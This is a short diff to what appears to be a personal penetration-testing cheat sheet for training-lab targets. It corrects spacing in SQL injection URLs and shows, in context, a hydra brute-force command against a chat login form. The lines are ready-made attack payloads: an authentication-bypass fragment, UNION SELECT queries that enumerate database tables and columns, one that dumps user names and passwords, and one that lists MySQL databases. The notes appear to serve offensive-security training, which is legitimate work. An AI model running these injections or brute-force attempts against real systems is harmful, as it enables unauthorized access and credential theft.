@@ -19,8 +19,8 @@ hydra internal-01.bart.htb http-form-post "/simple_chat/login.php:uname=^USER^&p
 
 SQLI
 1=1 LIMIT 1;#
-http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,table_name,6FROM information_schema.tables
-http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,column_name,6FROM information_schema.columns where table_name='users'
+http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables
+http://10.11.1.35/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where table_name='users'
 http://10.11.11.137/comment.php?id=773%20union%20all%20select%201,2,3,4,concat(name,0x3a,password),6%20from%20users
 Databases present in mysql:
 http://10.11.11.137/comment.php?id=773 union all select 1,2,3,4,db,6 from mysql.db
